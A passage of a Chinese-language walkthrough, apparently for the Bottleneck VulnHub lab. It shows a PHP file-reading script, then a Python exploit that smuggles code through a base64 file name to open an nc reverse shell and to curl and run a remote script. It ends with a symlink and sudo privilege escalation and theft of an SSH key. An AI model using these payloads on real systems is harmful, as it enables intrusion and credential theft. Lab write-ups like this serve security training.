&amp;lt;body id=&amp;#34;page-top&amp;#34;&amp;gt;
&amp;lt;!-- Navigation --&amp;gt;
&amp;lt;nav class=&amp;#34;navbar navbar-expand-lg navbar-dark fixed-top&amp;#34; id=&amp;#34;mainNav&amp;#34;&amp;gt;
&amp;lt;div class=&amp;#34;container&amp;#34;&amp;gt;
&amp;lt;a class=&amp;#34;navbar-brand js-scroll-trigger&amp;#34; href=&amp;#34;#page-top&amp;#34;&amp;gt;Bottleneck&amp;lt;/a&amp;gt;
&amp;lt;button class=&amp;#34;navbar-toggler navbar-toggler-right&amp;#34; type=&amp;#34;button&amp;#34; data-toggle=&amp;#34;collapse&amp;#34; data-target=&amp;#34;#navbarResponsive&amp;#34; aria-controls=&amp;#34;navbarResponsive&amp;#34; aria-expanded=&amp;#34;false&amp;#34; aria-label=&amp;#34;Toggle navigation&amp;#34;&amp;gt;
Menu
&amp;lt;i class=&amp;#34;fas fa-bars&amp;#34;&amp;gt;&amp;lt;/i&amp;gt;
&amp;lt;/button&amp;gt;
&amp;lt;/div&amp;gt;
&amp;lt;/nav&amp;gt;
&amp;lt;section class=&amp;#34;bg-light page-section&amp;#34; id=&amp;#34;portfolio&amp;#34;&amp;gt;
&amp;lt;div class=&amp;#34;container&amp;#34;&amp;gt;
&amp;lt;div class=&amp;#34;row&amp;#34;&amp;gt;
&amp;lt;div class=&amp;#34;col-lg-12 text-center&amp;#34;&amp;gt;
&amp;lt;h2 class=&amp;#34;section-heading text-uppercase&amp;#34;&amp;gt;GALLERY&amp;lt;/h2&amp;gt;
&amp;lt;h3 class=&amp;#34;section-subheading text-muted&amp;#34;&amp;gt;Some of our beautiful images&amp;lt;/h3&amp;gt;
&amp;lt;/div&amp;gt;
&amp;lt;/div&amp;gt;
&amp;lt;div class=&amp;#34;row&amp;#34;&amp;gt;
&amp;lt;div class=&amp;#34;col-md-4 col-sm-6 portfolio-item&amp;#34;&amp;gt;
&amp;lt;a class=&amp;#34;portfolio-link&amp;#34; data-toggle=&amp;#34;modal&amp;#34; href=&amp;#34;#portfolioModal1&amp;#34;&amp;gt;
&amp;lt;div class=&amp;#34;portfolio-hover&amp;#34;&amp;gt;
&amp;lt;div class=&amp;#34;portfolio-hover-content&amp;#34;&amp;gt;
&amp;lt;i class=&amp;#34;fas fa-plus fa-3x&amp;#34;&amp;gt;&amp;lt;/i&amp;gt;
&amp;lt;/div&amp;gt;
&amp;lt;/div&amp;gt;
&amp;lt;img class=&amp;#34;img-fluid&amp;#34; src=&amp;#34;image_gallery.php?t=&amp;lt;?php echo $tstamp; ?&amp;gt;&amp;amp;f=Ym90dGxlbmVja19kb250YmUucG5n&amp;#34; alt=&amp;#34;&amp;#34;&amp;gt;
&amp;lt;/a&amp;gt;
&amp;lt;div class=&amp;#34;portfolio-caption&amp;#34;&amp;gt;
&amp;lt;h4&amp;gt;Analysis&amp;lt;/h4&amp;gt;
&amp;lt;/div&amp;gt;
&amp;lt;/div&amp;gt;
&amp;lt;div class=&amp;#34;col-md-4 col-sm-6 portfolio-item&amp;#34;&amp;gt;
&amp;lt;a class=&amp;#34;portfolio-link&amp;#34; data-toggle=&amp;#34;modal&amp;#34; href=&amp;#34;#portfolioModal2&amp;#34;&amp;gt;
&amp;lt;div class=&amp;#34;portfolio-hover&amp;#34;&amp;gt;
&amp;lt;div class=&amp;#34;portfolio-hover-content&amp;#34;&amp;gt;
&amp;lt;i class=&amp;#34;fas fa-plus fa-3x&amp;#34;&amp;gt;&amp;lt;/i&amp;gt;
&amp;lt;/div&amp;gt;
&amp;lt;/div&amp;gt;
&amp;lt;img class=&amp;#34;img-fluid&amp;#34; src=&amp;#34;image_gallery.php?t=&amp;lt;?php echo $tstamp; ?&amp;gt;&amp;amp;f=Ym90dGxlbmVja19kb250YmUucG5n&amp;#34; alt=&amp;#34;&amp;#34;&amp;gt;
&amp;lt;/a&amp;gt;
&amp;lt;div class=&amp;#34;portfolio-caption&amp;#34;&amp;gt;
&amp;lt;h4&amp;gt;Protection&amp;lt;/h4&amp;gt;
&amp;lt;/div&amp;gt;
&amp;lt;/div&amp;gt;
&amp;lt;div class=&amp;#34;col-md-4 col-sm-6 portfolio-item&amp;#34;&amp;gt;
&amp;lt;a class=&amp;#34;portfolio-link&amp;#34; data-toggle=&amp;#34;modal&amp;#34; href=&amp;#34;#portfolioModal3&amp;#34;&amp;gt;
&amp;lt;div class=&amp;#34;portfolio-hover&amp;#34;&amp;gt;
&amp;lt;div class=&amp;#34;portfolio-hover-content&amp;#34;&amp;gt;
&amp;lt;i class=&amp;#34;fas fa-plus fa-3x&amp;#34;&amp;gt;&amp;lt;/i&amp;gt;
&amp;lt;/div&amp;gt;
&amp;lt;/div&amp;gt;
&amp;lt;img class=&amp;#34;img-fluid&amp;#34; src=&amp;#34;image_gallery.php?t=&amp;lt;?php echo $tstamp; ?&amp;gt;&amp;amp;f=Ym90dGxlbmVja19kb250YmUucG5n&amp;#34; alt=&amp;#34;&amp;#34;&amp;gt;
&amp;lt;/a&amp;gt;
&amp;lt;div class=&amp;#34;portfolio-caption&amp;#34;&amp;gt;
&amp;lt;h4&amp;gt;Bypass&amp;lt;/h4&amp;gt;
&amp;lt;/div&amp;gt;
&amp;lt;/div&amp;gt;
&amp;lt;div class=&amp;#34;col-md-4 col-sm-6 portfolio-item&amp;#34;&amp;gt;
&amp;lt;a class=&amp;#34;portfolio-link&amp;#34; data-toggle=&amp;#34;modal&amp;#34; href=&amp;#34;#portfolioModal4&amp;#34;&amp;gt;
&amp;lt;div class=&amp;#34;portfolio-hover&amp;#34;&amp;gt;
&amp;lt;div class=&amp;#34;portfolio-hover-content&amp;#34;&amp;gt;
&amp;lt;i class=&amp;#34;fas fa-plus fa-3x&amp;#34;&amp;gt;&amp;lt;/i&amp;gt;
&amp;lt;/div&amp;gt;
&amp;lt;/div&amp;gt;
&amp;lt;img class=&amp;#34;img-fluid&amp;#34; src=&amp;#34;image_gallery.php?t=&amp;lt;?php echo $tstamp; ?&amp;gt;&amp;amp;f=Ym90dGxlbmVja19kb250YmUucG5n&amp;#34; alt=&amp;#34;&amp;#34;&amp;gt;
&amp;lt;/a&amp;gt;
&amp;lt;div class=&amp;#34;portfolio-caption&amp;#34;&amp;gt;
&amp;lt;h4&amp;gt;Include&amp;lt;/h4&amp;gt;
&amp;lt;/div&amp;gt;
&amp;lt;/div&amp;gt;
&amp;lt;div class=&amp;#34;col-md-4 col-sm-6 portfolio-item&amp;#34;&amp;gt;
&amp;lt;a class=&amp;#34;portfolio-link&amp;#34; data-toggle=&amp;#34;modal&amp;#34; href=&amp;#34;#portfolioModal5&amp;#34;&amp;gt;
&amp;lt;div class=&amp;#34;portfolio-hover&amp;#34;&amp;gt;
&amp;lt;div class=&amp;#34;portfolio-hover-content&amp;#34;&amp;gt;
&amp;lt;i class=&amp;#34;fas fa-plus fa-3x&amp;#34;&amp;gt;&amp;lt;/i&amp;gt;
&amp;lt;/div&amp;gt;
&amp;lt;/div&amp;gt;
&amp;lt;img class=&amp;#34;img-fluid&amp;#34; src=&amp;#34;image_gallery.php?t=&amp;lt;?php echo $tstamp; ?&amp;gt;&amp;amp;f=Ym90dGxlbmVja19kb250YmUucG5n&amp;#34; alt=&amp;#34;&amp;#34;&amp;gt;
&amp;lt;/a&amp;gt;
&amp;lt;div class=&amp;#34;portfolio-caption&amp;#34;&amp;gt;
&amp;lt;h4&amp;gt;Evaluation&amp;lt;/h4&amp;gt;
&amp;lt;/div&amp;gt;
&amp;lt;/div&amp;gt;
&amp;lt;div class=&amp;#34;col-md-4 col-sm-6 portfolio-item&amp;#34;&amp;gt;
&amp;lt;a class=&amp;#34;portfolio-link&amp;#34; data-toggle=&amp;#34;modal&amp;#34; href=&amp;#34;#portfolioModal6&amp;#34;&amp;gt;
&amp;lt;div class=&amp;#34;portfolio-hover&amp;#34;&amp;gt;
&amp;lt;div class=&amp;#34;portfolio-hover-content&amp;#34;&amp;gt;
&amp;lt;i class=&amp;#34;fas fa-plus fa-3x&amp;#34;&amp;gt;&amp;lt;/i&amp;gt;
&amp;lt;/div&amp;gt;
&amp;lt;/div&amp;gt;
&amp;lt;img class=&amp;#34;img-fluid&amp;#34; src=&amp;#34;image_gallery.php?t=&amp;lt;?php echo $tstamp; ?&amp;gt;&amp;amp;f=Ym90dGxlbmVja19kb250YmUucG5n&amp;#34; alt=&amp;#34;&amp;#34;&amp;gt;
&amp;lt;/a&amp;gt;
&amp;lt;div class=&amp;#34;portfolio-caption&amp;#34;&amp;gt;
&amp;lt;h4&amp;gt;Win&amp;lt;/h4&amp;gt;
&amp;lt;/div&amp;gt;
&amp;lt;/div&amp;gt;
&amp;lt;/div&amp;gt;
&amp;lt;/div&amp;gt;
&amp;lt;/section&amp;gt;
&amp;lt;!-- Footer --&amp;gt;
&amp;lt;footer class=&amp;#34;footer&amp;#34;&amp;gt;
&amp;lt;div class=&amp;#34;container&amp;#34;&amp;gt;
&amp;lt;div class=&amp;#34;row align-items-center&amp;#34;&amp;gt;
&amp;lt;div class=&amp;#34;col-md-4&amp;#34;&amp;gt;
&amp;lt;span class=&amp;#34;copyright&amp;#34;&amp;gt;Copyright &amp;amp;copy; This awesome website 2019&amp;lt;/span&amp;gt;
&amp;lt;/div&amp;gt;
&amp;lt;div class=&amp;#34;col-md-4&amp;#34;&amp;gt;
&amp;lt;ul class=&amp;#34;list-inline social-buttons&amp;#34;&amp;gt;
&amp;lt;li class=&amp;#34;list-inline-item&amp;#34;&amp;gt;
&amp;lt;a href=&amp;#34;https://twitter.com/bytevsbyt3&amp;#34;&amp;gt;
&amp;lt;i class=&amp;#34;fab fa-twitter&amp;#34;&amp;gt;&amp;lt;/i&amp;gt;
&amp;lt;/a&amp;gt;
&amp;lt;/li&amp;gt;
&amp;lt;li class=&amp;#34;list-inline-item&amp;#34;&amp;gt;
&amp;lt;a href=&amp;#34;https://github.com/bytevsbyte/&amp;#34;&amp;gt;
&amp;lt;i class=&amp;#34;fab fa-github&amp;#34;&amp;gt;&amp;lt;/i&amp;gt;
&amp;lt;/a&amp;gt;
&amp;lt;/li&amp;gt;
&amp;lt;li class=&amp;#34;list-inline-item&amp;#34;&amp;gt;
&amp;lt;a href=&amp;#34;https://github.com/beerpwn/ctf&amp;#34;&amp;gt;
&amp;lt;i class=&amp;#34;fab fa-github&amp;#34;&amp;gt;&amp;lt;/i&amp;gt;
&amp;lt;/a&amp;gt;
&amp;lt;/li&amp;gt;
&amp;lt;/ul&amp;gt;
&amp;lt;/div&amp;gt;
&amp;lt;div class=&amp;#34;col-md-4&amp;#34;&amp;gt;
&amp;lt;ul class=&amp;#34;list-inline quicklinks&amp;#34;&amp;gt;
&amp;lt;li class=&amp;#34;list-inline-item&amp;#34;&amp;gt;
&amp;lt;a href=&amp;#34;#&amp;#34;&amp;gt;Privacy Policy&amp;lt;/a&amp;gt;
&amp;lt;/li&amp;gt;
&amp;lt;li class=&amp;#34;list-inline-item&amp;#34;&amp;gt;
&amp;lt;a href=&amp;#34;#&amp;#34;&amp;gt;Terms of Use&amp;lt;/a&amp;gt;
&amp;lt;/li&amp;gt;
&amp;lt;/ul&amp;gt;
&amp;lt;/div&amp;gt;
&amp;lt;/div&amp;gt;
&amp;lt;/div&amp;gt;
&amp;lt;/footer&amp;gt;
&amp;lt;script src=&amp;#34;vendor/jquery/jquery.min.js&amp;#34;&amp;gt;&amp;lt;/script&amp;gt;
&amp;lt;script src=&amp;#34;vendor/bootstrap/js/bootstrap.bundle.min.js&amp;#34;&amp;gt;&amp;lt;/script&amp;gt;
&amp;lt;script src=&amp;#34;vendor/jquery-easing/jquery.easing.min.js&amp;#34;&amp;gt;&amp;lt;/script&amp;gt;
&amp;lt;script src=&amp;#34;js/agency.js&amp;#34;&amp;gt;&amp;lt;/script&amp;gt;
&amp;lt;body&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code>&lt;/pre>&lt;p>修改python脚本的file地址，读取文件&lt;code>image_gallery_load.php&lt;/code>代码&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-php+HTML" data-lang="php+HTML">&amp;lt;?php
function print_troll(){
$messages = $GLOBALS[&amp;#39;messages&amp;#39;];
$troll = $GLOBALS[&amp;#39;troll&amp;#39;];
echo $messages[0];
echo $troll;
}
$troll = &amp;lt;&amp;lt;&amp;lt;EOT
&amp;lt;pre&amp;gt;
_,..._
/__ \
&amp;gt;&amp;lt; `. \
/_ \ |
\-_ /:|
,--&amp;#39;..&amp;#39;. :
,&amp;#39; `.
_,&amp;#39; \
_.._,--&amp;#39;&amp;#39; , |
, ,&amp;#39;,, _| _,.&amp;#39;| | |
\\||/,&amp;#39;(,&amp;#39; &amp;#39;--&amp;#39;&amp;#39; | | |
_ ||| | /-&amp;#39; |
| | (- -)&amp;lt;`._ | / /
| | \_\O/_/`-.(&amp;lt;&amp;lt; |____/ /
| | / \ / -&amp;#39;| `--.&amp;#39;|
| | \___/ / /
| | H H / | |
|_|_..-H-H--.._ / ,| |
|-.._&amp;#34;_&amp;#34;__..-| | _-/ | |
| | | | \_ |
| | | | | |
| | |____| | |
| | _..&amp;#39; | |____|
| |_(____..._&amp;#39; _.&amp;#39; |
`-..______..-&amp;#39;&amp;#34;&amp;#34; (___..--&amp;#39;
&amp;lt;pre&amp;gt;
EOT;
if(!isset($_GET[&amp;#39;t&amp;#39;]) || !isset($_GET[&amp;#39;f&amp;#39;])){
exit();
}
$imagefile = base64_decode($_GET[&amp;#39;f&amp;#39;]);
$timestamp = time();
$isblocked = FALSE;
$blacklist = array(&amp;#39;/etc&amp;#39;,&amp;#39;/opt&amp;#39;,&amp;#39;/var&amp;#39;,&amp;#39;/opt&amp;#39;,&amp;#39;/proc&amp;#39;,&amp;#39;/dev&amp;#39;,&amp;#39;/lib&amp;#39;,&amp;#39;/bin&amp;#39;,&amp;#39;/usr&amp;#39;,&amp;#39;/home&amp;#39;,&amp;#39;/ids&amp;#39;);
$messages = array(&amp;#34;\nLet me throw away your nice request into the bin.\n&amp;#34;.
&amp;#34;The SOC was informed about your attempt to break into this site. Thanks to previous attackers effort in smashing my infrastructructure I will take strong legal measures.\n&amp;#34;.
&amp;#34;Why don&amp;#39;t you wait on your chair until someone (maybe the police) knock on your door?\n\n&amp;#34;);
if(abs($_GET[&amp;#39;t&amp;#39;] - $timestamp) &amp;gt; 10){
exit();
}
foreach($blacklist as $elem){
if(strstr($imagefile, $elem) !== FALSE)
$isblocked = TRUE;
}
// report the intrusion to the soc and save information locally for further investigation
if($isblocked){
$logfile = &amp;#39;intrusion_&amp;#39;.$timestamp;
$fp = fopen(&amp;#39;/var/log/soc/&amp;#39;.$logfile, &amp;#39;w&amp;#39;);
fwrite($fp, &amp;#34;&amp;#39;&amp;#34;.$imagefile.&amp;#34;&amp;#39;&amp;#34;);
fclose($fp);
exec(&amp;#39;python /opt/ids_strong_bvb.py &amp;lt;/var/log/soc/&amp;#39;.$logfile.&amp;#39; &amp;gt;/tmp/output 2&amp;gt;&amp;amp;1&amp;#39;);
print_troll();
exit();
}
chdir(&amp;#39;img&amp;#39;);
$filecontent = file_get_contents($imagefile);
if($filecontent === FALSE){
print_troll();
}
else{
echo $filecontent;
}
chdir(&amp;#39;../&amp;#39;);
?&amp;gt;
&lt;/code>&lt;/pre>&lt;p>将参数f进行base64解密，当包含黑名单字符串时，记录到文件放在目录&lt;code>/var/log/soc/&lt;/code>，然后 &lt;code>/opt/ids_strong_bvb.py&lt;/code> 执行，精简一下&lt;/p>
&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&amp;lt;?php
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00688b">$imagefile&lt;/span> = base64_decode(&lt;span style="color:#00688b">$_GET&lt;/span>[&lt;span style="color:#cd5555">&amp;#39;f&amp;#39;&lt;/span>]);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00688b">$fp&lt;/span> = fopen(&lt;span style="color:#cd5555">&amp;#39;/var/log/soc/&amp;#39;&lt;/span>.&lt;span style="color:#00688b">$logfile&lt;/span>, &lt;span style="color:#cd5555">&amp;#39;w&amp;#39;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>fwrite(&lt;span style="color:#00688b">$fp&lt;/span>, &lt;span style="color:#cd5555">&amp;#34;&amp;#39;&amp;#34;&lt;/span>.&lt;span style="color:#00688b">$imagefile&lt;/span>.&lt;span style="color:#cd5555">&amp;#34;&amp;#39;&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>exec(&lt;span style="color:#cd5555">&amp;#39;python /opt/ids_strong_bvb.py &amp;lt;/var/log/soc/&amp;#39;&lt;/span>.&lt;span style="color:#00688b">$logfile&lt;/span>.&lt;span style="color:#cd5555">&amp;#39; &amp;gt;/tmp/output 2&amp;gt;&amp;amp;1&amp;#39;&lt;/span>);
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="获得权限">获得权限&lt;/h2>
&lt;p>尝试了各种nc反弹shell均失败，各种尝试，最终成功反弹shell ，&lt;a href="https://saucer-man.com/reverse/?ip=10.0.2.24&amp;amp;port=444">参考&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8b008b;font-weight:bold">import&lt;/span> &lt;span style="color:#008b45;text-decoration:underline">base64&lt;/span>,&lt;span style="color:#008b45;text-decoration:underline">time&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8b008b;font-weight:bold">from&lt;/span> &lt;span style="color:#008b45;text-decoration:underline">importlib.resources&lt;/span> &lt;span style="color:#8b008b;font-weight:bold">import&lt;/span> path
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8b008b;font-weight:bold">import&lt;/span> &lt;span style="color:#008b45;text-decoration:underline">time&lt;/span>,&lt;span style="color:#008b45;text-decoration:underline">requests&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>timestamp = &lt;span style="color:#658b00">str&lt;/span>(&lt;span style="color:#658b00">int&lt;/span>(time.time())+&lt;span style="color:#b452cd">8&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>path= &lt;span style="color:#cd5555">b&lt;/span>&lt;span style="color:#cd5555">&amp;#34;../etc/passwd&amp;#39; and __import__(&amp;#39;os&amp;#39;).system(&amp;#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.0.2.24 444 &amp;gt;/tmp/f&amp;#39;) and &amp;#39; &amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>file = base64.b64encode(path)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>file=file.decode(&lt;span style="color:#cd5555">&amp;#34;utf-8&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>url = &lt;span style="color:#cd5555">&amp;#39;http://10.0.2.34/image_gallery.php?t=&amp;#39;&lt;/span>+ timestamp +&lt;span style="color:#cd5555">&amp;#39;&amp;amp;f=&amp;#39;&lt;/span>+file
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#658b00">print&lt;/span>(&lt;span style="color:#cd5555">&amp;#39;http://10.0.2.34/img/&amp;#39;&lt;/span> + path.decode(&lt;span style="color:#cd5555">&amp;#34;utf-8&amp;#34;&lt;/span>))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#658b00">print&lt;/span>(url)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>res = requests.get(url)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#658b00">print&lt;/span>(res.text)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>后面想直接下载反弹脚本并执行&lt;/p>
&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>path= &lt;span style="color:#cd5555">b&lt;/span>&lt;span style="color:#cd5555">&amp;#34;../etc/passwd&amp;#39; and __import__(&amp;#39;os&amp;#39;).system(&amp;#39;curl http://10.0.2.24/reverse/r444.py -o /tmp/r444.py;python /tmp/r444.py&amp;#39;) and &amp;#39; &amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>一样成功获得反弹shell&lt;/p>
&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/374/5.webp" alt="5">&lt;/p>
&lt;h2 id="提权">提权&lt;/h2>
&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/374/6.webp" alt="6">&lt;/p>
&lt;p>查看目录&lt;code>/var/www/html/web_utils/&lt;/code>权限可写，先上php一句话方便编辑文件&lt;/p>
&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/374/7.webp" alt="7">&lt;/p>
&lt;p>进一步查看文件&lt;code>clear_logs&lt;/code>发现是个软链接&lt;/p>
&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/374/8.webp" alt="8">&lt;/p>
&lt;h3 id="bytevsbyte">bytevsbyte&lt;/h3>
&lt;p>果断重置软链接&lt;/p>
&lt;pre tabindex="0">&lt;code>ln -fns /tmp/clear_logsc /var/www/html/web_utils/clear_logs
echo &amp;#39;#!/bin/bash\n/bin/bash&amp;#39; &amp;gt; /tmp/clear_logsc
chmod 777 /tmp/clear_logsc
&lt;/code>&lt;/pre>&lt;p>尝试切换至用户&lt;code>bytevsbyte&lt;/code>&lt;/p>
&lt;pre tabindex="0">&lt;code>sudo -u bytevsbyte /var/www/html/web_utils/clear_logs
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/374/9.webp" alt="9">&lt;/p>
&lt;p>下载&lt;code>~/.ssh/id_rsa&lt;/code>登录&lt;/p>
&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/374/10.webp" alt="10">&lt;/p>
&lt;h3 id="linpeassh">linpeas.sh&lt;/h3>
&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/374/11.webp" alt="11">&lt;/p>
&lt;p>跟踪到&lt;code>/usr/test&lt;/code>目录发现疑似&lt;code>testlib&lt;/code>的源码&lt;/p>
&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/374/12.webp" alt="12">&lt;/p>
&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
